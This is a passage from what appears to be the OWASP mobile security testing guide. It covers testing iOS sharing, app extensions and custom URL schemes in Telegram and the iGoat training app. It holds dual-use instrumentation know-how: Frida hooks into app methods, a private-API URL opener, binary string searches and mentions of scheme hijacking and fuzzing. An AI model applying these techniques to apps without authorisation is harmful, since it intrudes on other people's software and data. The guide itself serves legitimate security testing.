ObjC.classes.UIActivityViewController['- excludedActivityTypes'].implementation, {
  onEnter: function (args) {
    printHeader(args)
  },
  onLeave: function (retval) {
    printRet(retval);
  }
});

function printHeader(args) {
  console.log(Memory.readUtf8String(args[1]) + " @ " + args[1])
};

function printRet(retval) {
  console.log('RET @ ' + retval + ': ' );
  try {
    console.log(new ObjC.Object(retval).toString());
  } catch (e) {
    console.log(retval.toString());
  }
};
```

You can store this as a JavaScript file, e.g. `inspect_send_activity_data.js` and load it like this:

```bash
frida -U Telegram -l inspect_send_activity_data.js
```

Now observe the output when you first share a picture:

```javascript
[*] initWithActivityItems:applicationActivities: @ 0x18c130c07
initWithActivityItems: (
    "<UIImage: 0x1c4aa0b40> size {571, 264} orientation 0 scale 1.000000"
)
applicationActivities: nil
RET @ 0x13cb2b800:
<UIActivityViewController: 0x13cb2b800>

[*] excludedActivityTypes @ 0x18c0f8429
RET @ 0x0:
nil
```

and then a text file:

```javascript
[*] initWithActivityItems:applicationActivities: @ 0x18c130c07
initWithActivityItems: (
    "<QLActivityItemProvider: 0x1c4a30140>",
    "<UIPrintInfo: 0x1c0699a50>"
)
applicationActivities: (
)
RET @ 0x13c4bdc00:
<_UIDICActivityViewController: 0x13c4bdc00>

[*] excludedActivityTypes @ 0x18c0f8429
RET @ 0x1c001b1d0:
(
    "com.apple.UIKit.activity.MarkupAsPDF"
)
```

You can see that:

- For the picture, the activity item is a `UIImage` and there are no excluded activities.
- For the text file there are two different activity items and `com.apple.UIKit.activity. MarkupAsPDF` is excluded.

In the previous example, there were no custom `applicationActivities` and only one excluded activity. However, to better illustrate what you can expect from other apps we have shared a picture using another app, here you can see a bunch of application activities and excluded activities (output was edited to hide the name of the originating app):

```javascript
[*] initWithActivityItems:applicationActivities: @ 0x18c130c07
initWithActivityItems: (
    "<SomeActivityItemProvider: 0x1c04bd580>"
)
applicationActivities: (
    "<SomeActionItemActivityAdapter: 0x141de83b0>",
    "<SomeActionItemActivityAdapter: 0x147971cf0>",
    "<SomeOpenInSafariActivity: 0x1479f0030>",
    "<SomeOpenInChromeActivity: 0x1c0c8a500>"
)
RET @ 0x142138a00:
<SomeActivityViewController: 0x142138a00>

[*] excludedActivityTypes @ 0x18c0f8429
RET @ 0x14797c3e0:
(
    "com.apple.UIKit.activity.Print",
    "com.apple.UIKit.activity.AssignToContact",
    "com.apple.UIKit.activity.SaveToCameraRoll",
    "com.apple.UIKit.activity.CopyToPasteboard",
)
```

### Receiving Items

After performing the static analysis you would know the _document types that the app can open_ and _if it declares any custom document types_ and (part of) the methods involved. You can use this now to test the receiving part:

- _Share_ a file with the app from another app or send it via AirDrop or e-mail. Choose the file so that it will trigger the "Open with..." dialogue (that is, there is no default app that will open the file, a PDF for example).
- Hook `application:openURL:options:` and any other methods that were identified in a previous static analysis.
- Observe the app behavior.
- In addition, you could send specific malformed files and/or use a fuzzing technique.

To illustrate this with an example we have chosen the same real-world file manager app from the static analysis section and followed these steps:

1. Send a PDF file from another Apple device (e.g. a MacBook) via Airdrop.
2. Wait for the **AirDrop** popup to appear and click on **Accept**.
3. As there is no default app that will open the file, it switches to the **Open with...** popup. There, we can select the app that will open our file. The next screenshot shows this (we have modified the display name using Frida to conceal the app's real name):

    <img src="Images/Chapters/0x06h/airdrop_openwith.png" width="400px" />

4. After selecting **SomeFileManager** we can see the following:

    ```bash
    (0x1c4077000)  -[AppDelegate application:openURL:options:]
    application: <UIApplication: 0x101c00950>
    openURL: file:///var/mobile/Library/Application%20Support
                        /Containers/com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf
    options: {
        UIApplicationOpenURLOptionsAnnotationKey =     {
            LSMoveDocumentOnOpen = 1;
        };
        UIApplicationOpenURLOptionsOpenInPlaceKey = 0;
        UIApplicationOpenURLOptionsSourceApplicationKey = "com.apple.sharingd";
        "_UIApplicationOpenURLOptionsSourceProcessHandleKey" = "<FBSProcessHandle: 0x1c3a63140;
                                                                    sharingd:605; valid: YES>";
    }
    0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke
    ...
    0x1857cdc34 FrontBoardServices!-[FBSSerialQueue _performNextFromRunLoopSource]
    RET: 0x1
    ```

As you can see, the sending application is `com.apple.sharingd` and the URL's scheme is `file://`. Note that once we select the app that should open the file, the system already moved the file to the corresponding destination, that is to the app's Inbox. The apps are then responsible for deleting the files inside their Inboxes. This app, for example, moves the file to `/var/mobile/Documents/` and removes it from the Inbox.

```bash
(0x1c002c760)  -[XXFileManager moveItemAtPath:toPath:error:]
moveItemAtPath: /var/mobile/Library/Application Support/Containers
                            /com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf
toPath: /var/mobile/Documents/OWASP_MASVS (1).pdf
error: 0x16f095bf8
0x100f24e90 SomeFileManager!-[AppDelegate __handleOpenURL:]
0x100f25198 SomeFileManager!-[AppDelegate application:openURL:options:]
0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke
...
0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__
RET: 0x1
```

If you look at the stack trace, you can see how `application:openURL:options:` called `__handleOpenURL:`, which called `moveItemAtPath:toPath:error:`. Notice that we have now this information without having the source code for the target app. The first thing that we had to do was clear: hook `application:openURL:options:`. Regarding the rest, we had to think a little bit and come up with methods that we could start tracing and are related to the file manager, for example, all methods containing the strings "copy", "move", "remove", etc. until we have found that the one being called was `moveItemAtPath:toPath:error:`.

A final thing worth noticing here is that this way of handling incoming files is the same for custom URL schemes. Please refer to @MASTG-TEST-0075 for more information.
## Testing App Extensions

## Overview

## Static Analysis

The static analysis will take care of:

- Verifying if the app contains app extensions
- Determining the supported data types
- Checking data sharing with the containing app
- Verifying if the app restricts the use of app extensions

### Verifying if the App Contains App Extensions

If you have the original source code you can search for all occurrences of `NSExtensionPointIdentifier` with Xcode (cmd+shift+f) or take a look into "Build Phases / Embed App extensions":

<img src="Images/Chapters/0x06h/xcode_embed_app_extensions.png" width="100%" />

There you can find the names of all embedded app extensions followed by `.appex`, now you can navigate to the individual app extensions in the project.

If not having the original source code:

Grep for `NSExtensionPointIdentifier` among all files inside the app bundle (IPA or installed app):

```bash
$ grep -nr NSExtensionPointIdentifier Payload/Telegram\ X.app/
Binary file Payload/Telegram X.app//PlugIns/SiriIntents.appex/Info.plist matches
Binary file Payload/Telegram X.app//PlugIns/Share.appex/Info.plist matches
Binary file Payload/Telegram X.app//PlugIns/NotificationContent.appex/Info.plist matches
Binary file Payload/Telegram X.app//PlugIns/Widget.appex/Info.plist matches
Binary file Payload/Telegram X.app//Watch/Watch.app/PlugIns/Watch Extension.appex/Info.plist matches
```

You can also access per SSH, find the app bundle and list all inside PlugIns (they are placed there by default) or do it with objection:

```bash
ph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # cd PlugIns
    /var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/
    Telegram X.app/PlugIns

ph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    Read    Write     Name
------------  -------  ------------------  ------  -------   -------------------------
Directory         493  None                True    False     NotificationContent.appex
Directory         493  None                True    False     Widget.appex
Directory         493  None                True    False     Share.appex
Directory         493  None                True    False     SiriIntents.appex
```

We can see now the same four app extensions that we saw in Xcode before.

### Determining the Supported Data Types

This is important for data being shared with host apps (e.g. via Share or Action Extensions). When the user selects some data type in a host app and it matches the data types define here, the host app will offer the extension. It is worth noticing the difference between this and data sharing via `UIActivity` where we had to define the document types, also using UTIs. An app does not need to have an extension for that. It is possible to share data using only `UIActivity`.

Inspect the app extension's `Info.plist` file and search for `NSExtensionActivationRule`. That key specifies the data being supported as well as e.g. maximum of items supported. For example:

```xml
<key>NSExtensionAttributes</key>
    <dict>
        <key>NSExtensionActivationRule</key>
        <dict>
            <key>NSExtensionActivationSupportsImageWithMaxCount</key>
            <integer>10</integer>
            <key>NSExtensionActivationSupportsMovieWithMaxCount</key>
            <integer>1</integer>
            <key>NSExtensionActivationSupportsWebURLWithMaxCount</key>
            <integer>1</integer>
        </dict>
    </dict>
```

Only the data types present here and not having `0` as `MaxCount` will be supported. However, more complex filtering is possible by using a so-called predicate string that will evaluate the UTIs given. Please refer to the [Apple App Extension Programming Guide](https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html#//apple_ref/doc/uid/TP40014214-CH21-SW8 "Declaring Supported Data Types for a Share or Action Extension") for more detailed information about this.

### Checking Data Sharing with the Containing App

Remember that app extensions and their containing apps do not have direct access to each other's containers. However, data sharing can be enabled. This is done via ["App Groups"](https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/EnablingAppSandbox.html#//apple_ref/doc/uid/TP40011195-CH4-SW19 "Adding an App to an App Group") and the [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults "NSUserDefaults") API. See this figure from [Apple App Extension Programming Guide](https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html#//apple_ref/doc/uid/TP40014214-CH21-SW11 "An app extension's container is distinct from its containing app's container"):

<img src="Images/Chapters/0x06h/app_extensions_container_restrictions.png" width="400px" />

As also mentioned in the guide, the app must set up a shared container if the app extension uses the `NSURLSession` class to perform a background upload or download, so that both the extension and its containing app can access the transferred data.

### Verifying if the App Restricts the Use of App Extensions

It is possible to reject a specific type of app extension by using the following method:

- [`application:shouldAllowExtensionPointIdentifier:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623122-application?language=objc "UIApplicationDelegate application:shouldAllowExtensionPointIdentifier:")

However, it is currently only possible for "custom keyboard" app extensions (and should be verified when testing apps handling sensitive data via the keyboard like e.g. banking apps).

## Dynamic Analysis

For the dynamic analysis we can do the following to gain knowledge without having the source code:

- Inspecting the items being shared
- Identifying the app extensions involved

### Inspecting the Items Being Shared

For this we should hook `NSExtensionContext - inputItems` in the data originating app.

Following the previous example of Telegram we will now use the "Share" button on a text file (that was received from a chat) to create a note in the Notes app with it:

<img src="Images/Chapters/0x06h/telegram_share_extension.png" width="400px" />

If we run a trace, we'd see the following output:

```bash
(0x1c06bb420) NSExtensionContext - inputItems
0x18284355c Foundation!-[NSExtension _itemProviderForPayload:extensionContext:]
0x1828447a4 Foundation!-[NSExtension _loadItemForPayload:contextIdentifier:completionHandler:]
0x182973224 Foundation!__NSXPCCONNECTION_IS_CALLING_OUT_TO_EXPORTED_OBJECT_S3__
0x182971968 Foundation!-[NSXPCConnection _decodeAndInvokeMessageWithEvent:flags:]
0x182748830 Foundation!message_handler
0x181ac27d0 libxpc.dylib!_xpc_connection_call_event_handler
0x181ac0168 libxpc.dylib!_xpc_connection_mach_event
...
RET: (
"<NSExtensionItem: 0x1c420a540> - userInfo:
{
    NSExtensionItemAttachmentsKey =     (
    "<NSItemProvider: 0x1c46b30e0> {types = (\n \"public.plain-text\",\n \"public.file-url\"\n)}"
    );
}"
)
```

Here we can observe that:

- This occurred under-the-hood via XPC, concretely it is implemented via a `NSXPCConnection` that uses the `libxpc.dylib` Framework.
- The UTIs included in the `NSItemProvider` are `public.plain-text` and `public.file-url`, the latter being included in `NSExtensionActivationRule` from the [`Info.plist` of the "Share Extension" of Telegram](https://github.com/TelegramMessenger/Telegram-iOS/blob/master/Telegram/Share/Info.plist "Info.plist of the \'Share Extension\' of Telegram").

### Identifying the App Extensions Involved

You can also find out which app extension is taking care of your the requests and responses by hooking `NSExtension - _plugIn`:

We run the same example again:

```bash
(0x1c0370200) NSExtension - _plugIn
RET: <PKPlugin: 0x1163637f0 ph.telegra.Telegraph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785
1(2) /private/var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35
/Telegram X.app/PlugIns/Share.appex>

(0x1c0372300)  -[NSExtension _plugIn]
RET: <PKPlugin: 0x10bff7910 com.apple.mobilenotes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83
F90A1414DC 1(2) /private/var/containers/Bundle/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D
/MobileNotes.app/PlugIns/com.apple.mobilenotes.SharingExtension.appex>
```

As you can see there are two app extensions involved:

- `Share.appex` is sending the text file (`public.plain-text` and `public.file-url`).
- `com.apple.mobilenotes.SharingExtension.appex` which is receiving and will process the text file.

If you want to learn more about what's happening under-the-hood in terms of XPC, we recommend to take a look at the internal calls from "libxpc.dylib". For example you can use [`frida-trace`](https://www.frida.re/docs/frida-trace/ "frida-trace") and then dig deeper into the methods that you find more interesting by extending the automatically generated stubs.
## Testing Custom URL Schemes

## Overview

## Static Analysis

There are a couple of things that we can do using static analysis. In the next sections we will see the following:

- Testing custom URL schemes registration
- Testing application query schemes registration
- Testing URL handling and validation
- Testing URL requests to other apps
- Testing for deprecated methods

### Testing Custom URL Schemes Registration

The first step to test custom URL schemes is finding out whether an application registers any protocol handlers.

If you have the original source code and want to view registered protocol handlers, simply open the project in Xcode, go to the **Info** tab and open the **URL Types** section as presented in the screenshot below:

<img src="Images/Chapters/0x06h/URL_scheme.png" width="100%" />

Also in Xcode you can find this by searching for the `CFBundleURLTypes` key in the app's `Info.plist` file (example from @MASTG-APP-0028):

```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLName</key>
        <string>com.iGoat.myCompany</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>iGoat</string>
        </array>
    </dict>
</array>
```

In a compiled application (or IPA), registered protocol handlers are found in the file `Info.plist` in the app bundle's root folder. Open it and search for the `CFBundleURLSchemes` key, if present, it should contain an array of strings (example from @MASTG-APP-0028):

```xml
grep -A 5 -nri urlsch Info.plist
Info.plist:45:    <key>CFBundleURLSchemes</key>
Info.plist-46-    <array>
Info.plist-47-        <string>iGoat</string>
Info.plist-48-    </array>
```

Once the URL scheme is registered, other apps can open the app that registered the scheme, and pass parameters by creating appropriately formatted URLs and opening them with the [`UIApplication openURL:options:completionHandler:`](https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc "UIApplication openURL:options:completionHandler:") method.

Note from the [App Programming Guide for iOS](https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html#//apple_ref/doc/uid/TP40007072-CH6-SW7 "Registering Custom URL Schemes"):

> If more than one third-party app registers to handle the same URL scheme, there is currently no process for determining which app will be given that scheme.

This could lead to a URL scheme hijacking attack (see page 136 in [#thiel2]).

### Testing Application Query Schemes Registration

Before calling the `openURL:options:completionHandler:` method, apps can call [`canOpenURL:`](https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl?language=objc "UIApplication canOpenURL:") to verify that the target app is available. However, as this method was being used by malicious app as a way to enumerate installed apps, [from iOS 9.0 the URL schemes passed to it must be also declared](https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl?language=objc#discussion "Discussion about UIApplication canOpenURL:") by adding the `LSApplicationQueriesSchemes` key to the app's `Info.plist` file and an array of up to 50 URL schemes.

```xml
<key>LSApplicationQueriesSchemes</key>
    <array>
        <string>url_scheme1</string>
        <string>url_scheme2</string>
    </array>
```

`canOpenURL` will always return `NO` for undeclared schemes, whether or not an appropriate app is installed. However, this restriction only applies to `canOpenURL`.

**The `openURL:options:completionHandler:` method will still open any URL scheme, even if the `LSApplicationQueriesSchemes` array was declared**, and return `YES` / `NO` depending on the result.

As an example, Telegram declares in its [`Info.plist`](https://github.com/TelegramMessenger/Telegram-iOS/blob/master/Telegram/Telegram-iOS/Info.plist#L233 "Telegram\'s Info.plist Line 63") these Queries Schemes, among others:

```xml
    <key>LSApplicationQueriesSchemes</key>
    <array>
        <string>dbapi-3</string>
        <string>instagram</string>
        <string>googledrive</string>
        <string>comgooglemaps-x-callback</string>
        <string>foursquare</string>
        <string>here-location</string>
        <string>yandexmaps</string>
        <string>yandexnavi</string>
        <string>comgooglemaps</string>
        <string>youtube</string>
        <string>twitter</string>
        ...
```

### Testing URL Handling and Validation

In order to determine how a URL path is built and validated, if you have the original source code, you can search for the following methods:

- `application:didFinishLaunchingWithOptions:` method or `application:will-FinishLaunchingWithOptions:`: verify how the decision is made and how the information about the URL is retrieved.
- [`application:openURL:options:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc "UIApplicationDelegate application:openURL:options:"): verify how the resource is being opened, i.e. how the data is being parsed, verify the [options](https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey "UIApplicationOpenURLOptionsKey"), especially if access by the calling app ([`sourceApplication`](https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey/1623128-sourceapplication "UIApplicationOpenURLOptionsSourceApplicationKey")) should be allowed or denied. The app might also need user permission when using the custom URL scheme.

In Telegram you will [find four different methods being used](https://github.com/peter-iakovlev/Telegram-iOS/blob/87e0a33ac438c1d702f2a0b75bf21f26866e346f/Telegram-iOS/AppDelegate.swift#L1250 "Telegram\'s AppDelegate.swift Line 1250"):

```default
func application(_ application: UIApplication, open url: URL, sourceApplication: String?) -> Bool {
    self.openUrl(url: url)
    return true
}

func application(_ application: UIApplication, open url: URL, sourceApplication: String?,
annotation: Any) -> Bool {
    self.openUrl(url: url)
    return true
}

func application(_ app: UIApplication, open url: URL,
options: [UIApplicationOpenURLOptionsKey : Any] = [:]) -> Bool {
    self.openUrl(url: url)
    return true
}

func application(_ application: UIApplication, handleOpen url: URL) -> Bool {
    self.openUrl(url: url)
    return true
}
```

We can observe some things here:

- The app implements also deprecated methods like [`application:handleOpenURL:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc "UIApplicationDelegate application:handleOpenURL:") and [`application:openURL:sourceApplication:annotation:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application "UIApplicationDelegate application:openURL:sourceApplication:annotation:").
- The source application is not being verified in any of those methods.
- All of them call a private `openUrl` method. You can [inspect it](https://github.com/peter-iakovlev/Telegram-iOS/blob/87e0a33ac438c1d702f2a0b75bf21f26866e346f/Telegram-iOS/AppDelegate.swift#L1270 "Telegram\'s AppDelegate.swift Line 1270") to learn more about how the URL request is handled.

### Testing URL Requests to Other Apps

The method [`openURL:options:completionHandler:`](https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc "UIApplication openURL:options:completionHandler:") and the [deprecated `openURL:` method of `UIApplication`](https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc "UIApplication openURL:") are responsible for opening URLs (i.e. to send requests / make queries to other apps) that may be local to the current app or it may be one that must be provided by a different app. If you have the original source code you can search directly for usages of those methods.

Additionally, if you are interested into knowing if the app is querying specific services or apps, and if the app is well-known, you can also search for common URL schemes online and include them in your greps. For example, a [quick Google search reveals](https://web.archive.org/web/20200903221322/https://ios.gadgethacks.com/news/always-updated-list-ios-app-url-scheme-names-0184033/ "Always-Updated List of iOS App URL Scheme Names"):

```default
Apple Music - music:// or musics:// or audio-player-event://
Calendar - calshow:// or x-apple-calevent://
Contacts - contacts://
Diagnostics - diagnostics:// or diags://
GarageBand - garageband://
iBooks - ibooks:// or itms-books:// or itms-bookss://
Mail - message:// or mailto://emailaddress
Messages - sms://phonenumber
Notes - mobilenotes://
...
```

We search for this method in the Telegram source code, this time without using Xcode, just with `egrep`:

```bash
$ egrep -nr "open.*options.*completionHandler" ./Telegram-iOS/

./AppDelegate.swift:552: return UIApplication.shared.open(parsedUrl,
    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],
    completionHandler: { value in
./AppDelegate.swift:556: return UIApplication.shared.open(parsedUrl,
    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],
    completionHandler: { value in
```

If we inspect the results we will see that `openURL:options:completionHandler:` is actually being used for universal links, so we have to keep searching. For example, we can search for `openURL(`:

```bash
$ egrep -nr "openURL\(" ./Telegram-iOS/

./ApplicationContext.swift:763:  UIApplication.shared.openURL(parsedUrl)
./ApplicationContext.swift:792:  UIApplication.shared.openURL(URL(
                                        string: "https://telegram.org/deactivate?phone=\(phone)")!
                                 )
./AppDelegate.swift:423:         UIApplication.shared.openURL(url)
./AppDelegate.swift:538:         UIApplication.shared.openURL(parsedUrl)
...
```

If we inspect those lines we will see how this method is also being used to open "Settings" or to open the "App Store Page".

When just searching for `://` we see:

```default
if documentUri.hasPrefix("file://"), let path = URL(string: documentUri)?.path {
if !url.hasPrefix("mt-encrypted-file://?") {
guard let dict = TGStringUtils.argumentDictionary(inUrlString: String(url[url.index(url.startIndex,
    offsetBy: "mt-encrypted-file://?".count)...])) else {
parsedUrl = URL(string: "https://\(url)")
if let url = URL(string: "itms-apps://itunes.apple.com/app/id\(appStoreId)") {
} else if let url = url as? String, url.lowercased().hasPrefix("tg://") {
[[WKExtension sharedExtension] openSystemURL:[NSURL URLWithString:[NSString
    stringWithFormat:@"tel://%@", userHandle.data]]];
```

After combining the results of both searches and carefully inspecting the source code we find the following piece of code:

```default
openUrl: { url in
            var parsedUrl = URL(string: url)
            if let parsed = parsedUrl {
                if parsed.scheme == nil || parsed.scheme!.isEmpty {
                    parsedUrl = URL(string: "https://\(url)")
                }
                if parsed.scheme == "tg" {
                    return
                }
            }

            if let parsedUrl = parsedUrl {
                UIApplication.shared.openURL(parsedUrl)
```

Before opening a URL, the scheme is validated, "https" will be added if necessary and it won't open any URL with the "tg" scheme. When ready it will use the deprecated `openURL` method.

If only having the compiled application (IPA) you can still try to identify which URL schemes are being used to query other apps:

- Check if `LSApplicationQueriesSchemes` was declared or search for common URL schemes.
- Also use the string `://` or build a regular expression to match URLs as the app might not be declaring some schemes.

You can do that by first verifying that the app binary contains those strings by e.g. using unix `strings` command:

```bash
strings <yourapp> | grep "someURLscheme://"
```

or even better, use radare2's `iz/izz` command or rafind2, both will find strings where the unix `strings` command won't. Example from @MASTG-APP-0028:

```bash
$ r2 -qc izz~iGoat:// iGoat-Swift
37436 0x001ee610 0x001ee610  23  24 (4.__TEXT.__cstring) ascii iGoat://?contactNumber=
```

### Testing for Deprecated Methods

Search for deprecated methods like:

- [`application:handleOpenURL:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc "UIApplicationDelegate application:handleOpenURL:")
- [`openURL:`](https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc "UIApplication openURL:")
- [`application:openURL:sourceApplication:annotation:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application "UIApplicationDelegate application:openURL:sourceApplication:annotation:")

For example, using @MASTG-TOOL-0129 we find those three:

```bash
$ rabin2 -zzq Telegram\ X.app/Telegram\ X | grep -i "openurl"

0x1000d9e90 31 30 UIApplicationOpenURLOptionsKey
0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:
0x1000dee71 29 28 application:openURL:options:
0x1000dee8e 27 26 application:handleOpenURL:
0x1000df2c9 9 8 openURL:
0x1000df766 12 11 canOpenURL:
0x1000df772 35 34 openURL:options:completionHandler:
...
```

## Dynamic Analysis

Once you've identified the custom URL schemes the app has registered, there are several methods that you can use to test them:

- Performing URL requests
- Identifying and hooking the URL handler method
- Testing URL schemes source validation
- Fuzzing URL schemes

### Performing URL Requests

#### Using Safari

To quickly test one URL scheme you can open the URLs on Safari and observe how the app behaves. For example, if you write `tel://123456789` in the address bar of Safari, a pop up will appear with the _telephone number_ and the options "Cancel" and "Call". If you press "Call" it will open the Phone app and directly make the call.

You may also know already about pages that trigger custom URL schemes, you can just navigate normally to those pages and Safari will automatically ask when it finds a custom URL scheme.

#### Using the Notes App

As already seen in "Triggering Universal Links", you may use the Notes app and long press the links you've written in order to test custom URL schemes. Remember to exit the editing mode in order to be able to open them. Note that you can click or long press links including custom URL schemes only if the app is installed, if not they won't be highlighted as _clickable links_.

#### Using Frida

If you simply want an app to open the URL scheme you can do it using Frida. Example using @MASTG-APP-0028:

```javascript
$ frida -U iGoat-Swift

[iPhone::iGoat-Swift]-> function openURL(url) {
                            var UIApplication = ObjC.classes.UIApplication.sharedApplication();
                            var toOpen = ObjC.classes.NSURL.URLWithString_(url);
                            return UIApplication.openURL_(toOpen);
                        }
[iPhone::iGoat-Swift]-> openURL("tel://234234234")
true
```

In this example from [Frida CodeShare](https://codeshare.frida.re/@dki/ios-url-scheme-fuzzing/ "iOS URL Scheme Fuzzing Script") the author uses the non-public API `LSApplication Workspace.openSensitiveURL:withOptions:` to open the URLs (from the SpringBoard app):

```javascript
function openURL(url) {
    var w = ObjC.classes.LSApplicationWorkspace.defaultWorkspace();
    var toOpen = ObjC.classes.NSURL.URLWithString_(url);
    return w.openSensitiveURL_withOptions_(toOpen, null);
}
```

!!! note
    The use of non-public APIs is not permitted on the App Store. That's why we don't even test these, but we are allowed to use them for our dynamic analysis.

### Identifying and Hooking the URL Handler Method

If you can't look into the original source code you will have to find out yourself which method does the app use to handle the URL scheme requests that it receives. You cannot know if it is an Objective-C method or a Swift one, or even if the app is using a deprecated one.

#### Crafting the Link Yourself and Letting Safari Open It

For this we will use the [ObjC method observer](https://codeshare.frida.re/@mrmacete/objc-method-observer/ "ObjC method observer") from Frida CodeShare, which is an extremely handy script that allows you to quickly observe any collection of methods or classes just by providing a simple pattern.

In this case we are interested into all methods from the @MASTG-APP-0028 app containing "openURL", therefore our pattern will be `*[* *openURL*]`:

- The first asterisk will match all instance `-` and class `+` methods.
- The second matches all Objective-C classes.
- The third and forth allow to match any method containing the string `openURL`.

```javascript
$ frida -U iGoat-Swift --codeshare mrmacete/objc-method-observer

[iPhone::iGoat-Swift]-> observeSomething("*[* *openURL*]");
Observing  -[_UIDICActivityItemProvider activityViewController:openURLAnnotationForActivityType:]
Observing  -[CNQuickActionsManager _openURL:]
Observing  -[SUClientController openURL:]
Observing  -[SUClientController openURL:inClientWithIdentifier:]
Observing  -[FBSSystemService openURL:application:options:clientPort:withResult:]
Observing  -[iGoat_Swift.AppDelegate application:openURL:options:]
Observing  -[PrefsUILinkLabel openURL:]
Observing  -[UIApplication openURL:]
Observing  -[UIApplication _openURL:]
Observing  -[UIApplication openURL:options:completionHandler:]
Observing  -[UIApplication openURL:withCompletionHandler:]
Observing  -[UIApplication _openURL:originatingView:completionHandler:]
Observing  -[SUApplication application:openURL:sourceApplication:annotation:]
...
```

The list is very long and includes the methods we have already mentioned. If we trigger now one URL scheme, for example "igoat://" from Safari and accept to open it in the app we will see the following:

```javascript
[iPhone::iGoat-Swift]-> (0x1c4038280)  -[iGoat_Swift.AppDelegate application:openURL:options:]
application: <UIApplication: 0x101d0fad0>
openURL: igoat://
options: {
    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;
    UIApplicationOpenURLOptionsSourceApplicationKey = "com.apple.mobilesafari";
}
0x18b5030d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke
0x18b502a94 UIKit!-[UIApplication _applicationOpenURLAction:payload:origin:]
...
0x1817e1048 libdispatch.dylib!_dispatch_client_callout
0x1817e86c8 libdispatch.dylib!_dispatch_block_invoke_direct$VARIANT$mp
0x18453d9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__
0x18453d698 FrontBoardServices!-[FBSSerialQueue _performNext]
RET: 0x1
```

Now we know that:

- The method `-[iGoat_Swift.AppDelegate application:openURL:options:]` gets called. As we have seen before, it is the recommended way and it is not deprecated.
- It receives our URL as a parameter: `igoat://`.
- We also can verify the source application: `com.apple.mobilesafari`.
- We can also know from where it was called, as expected from `-[UIApplication _applicationOpenURLAction:payload:origin:]`.
- The method returns `0x1` which means `YES` ([the delegate successfully handled the request](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc#return-value "application:openURL:options: Return Value")).

The call was successful and we see now that the @MASTG-APP-0028 app was open:

<img src="Images/Chapters/0x06h/iGoat_opened_via_url_scheme.jpg" width="400px" />

Notice that we can also see that the caller (source application) was Safari if we look in the upper-left corner of the screenshot.

#### Dynamically Opening the Link from the App Itself

It is also interesting to see which other methods get called on the way. To change the result a little bit we will call the same URL scheme from the @MASTG-APP-0028 app itself. We will use again ObjC method observer and the Frida REPL:

```javascript
$ frida -U iGoat-Swift --codeshare mrmacete/objc-method-observer

[iPhone::iGoat-Swift]-> function openURL(url) {
                            var UIApplication = ObjC.classes.UIApplication.sharedApplication();
                            var toOpen = ObjC.classes.NSURL.URLWithString_(url);
                            return UIApplication.openURL_(toOpen);
                        }

[iPhone::iGoat-Swift]-> observeSomething("*[* *openURL*]");
[iPhone::iGoat-Swift]-> openURL("iGoat://?contactNumber=123456789&message=hola")

(0x1c409e460)  -[__NSXPCInterfaceProxy__LSDOpenProtocol openURL:options:completionHandler:]
openURL: iGoat://?contactNumber=123456789&message=hola
options: nil
completionHandler: <__NSStackBlock__: 0x16fc89c38>
0x183befbec MobileCoreServices!-[LSApplicationWorkspace openURL:withOptions:error:]
0x10ba6400c
...
RET: nil

...

(0x101d0fad0)  -[UIApplication openURL:]
openURL: iGoat://?contactNumber=123456789&message=hola
0x10a610044
...
RET: 0x1

true
(0x1c4038280)  -[iGoat_Swift.AppDelegate application:openURL:options:]
application: <UIApplication: 0x101d0fad0>
openURL: iGoat://?contactNumber=123456789&message=hola
options: {
    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;
    UIApplicationOpenURLOptionsSourceApplicationKey = "OWASP.iGoat-Swift";
}
0x18b5030d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke
0x18b502a94 UIKit!-[UIApplication _applicationOpenURLAction:payload:origin:]
...
RET: 0x1
```

